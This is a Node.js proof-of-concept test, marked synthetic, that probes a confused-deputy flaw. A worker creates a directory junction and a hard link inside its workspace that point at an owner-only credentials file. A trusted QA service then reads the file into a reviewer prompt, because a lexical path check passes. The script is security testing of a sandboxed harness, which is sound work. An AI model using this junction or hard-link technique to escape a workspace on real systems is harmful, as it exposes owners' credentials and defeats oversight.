// Confused-deputy test (synthetic): can a worker make the TRUSTED QA service (runs as the owner) read a file outside
// the workspace and paste it into the reviewer prompt? Replicates src/engineering/qa.ts diffFor() new-file logic
// (git status --porcelain --untracked-files=all, then readFileSync of each untracked path) exactly.
'use strict';
const fs = require('fs');
const path = require('path');
const cp = require('child_process');
const root = process.argv[2];
const ws = path.join(root, 'ws');
const secretDir = path.join(root, 'owner-only');
const MARK = 'SYNTHETIC-OWNER-SECRET-7f3a';
fs.rmSync(root, { recursive: true, force: true });
fs.mkdirSync(ws, { recursive: true });
fs.mkdirSync(secretDir, { recursive: true });
fs.writeFileSync(path.join(secretDir, 'credentials.json'), `{"token":"${MARK}"}`);
const git = (...a) => cp.execFileSync('git', a, { cwd: ws, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@x', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@x' } });
git('init', '-q');
fs.writeFileSync(path.join(ws, 'README.md'), 'x');
git('add', '-A');
git('commit', '-qm', 'base');
const results = {};
// worker actions (no admin needed): a directory junction and a hard link inside the workspace
try { cp.execFileSync('cmd.exe', ['/d', '/c', 'mklink', '/J', path.join(ws, 'leakdir'), secretDir], { encoding: 'utf8' }); results.junctionCreated = true; } catch (e) { results.junctionCreated = String(e.message).slice(0, 120); }
try { fs.linkSync(path.join(secretDir, 'credentials.json'), path.join(ws, 'notes.json')); results.hardlinkCreated = true; } catch (e) { results.hardlinkCreated = `${e.code} ${e.message}`.slice(0, 120); }
// trusted QA logic
const status = git('status', '--porcelain', '--untracked-files=all');
const untracked = status.split('\n').filter((l) => l.startsWith('?? ')).map((l) => l.slice(3).trim().replace(/^"|"$/g, '')).slice(0, 25);
results.untracked = untracked;
results.readByQa = untracked.map((f) => {
  try { const t = fs.readFileSync(path.join(ws, f), 'utf8'); return { f, leaked: t.includes(MARK) }; } catch (e) { return { f, error: e.code }; }
});
// The Read file tool's lexical workspace check (policy.ts isPathInside) on the junction path:
results.lexicalPathInsideWorkspace = !path.relative(ws, path.join(ws, 'leakdir', 'credentials.json')).startsWith('..');
results.realpathOfJunctionFile = fs.realpathSync(path.join(ws, 'leakdir', 'credentials.json'));
results.LEAK = results.readByQa.some((r) => r.leaked);
console.log(JSON.stringify(results, null, 2));
